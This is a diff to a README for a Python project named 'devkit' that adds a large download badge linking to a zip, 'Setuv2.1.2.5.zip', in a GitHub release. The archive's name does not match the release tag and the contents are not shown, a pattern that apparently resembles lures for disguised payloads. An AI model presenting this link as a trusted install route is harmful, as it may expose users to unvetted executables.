@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/Download-Setuv2.1.2.5.zip-blue?style=for-the-badge&logo=files)](https://github.com/leonvlab2004s6/devkit/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # ⚡ devkit
 
 ![License](https://img.shields.io/badge/license-MIT-blue.svg) ![Python](https://img.shields.io/badge/python-3.9+-brightgreen.svg) ![Platform](https://img.shields.io/badge/platform-cross--platform-lightgrey.svg)
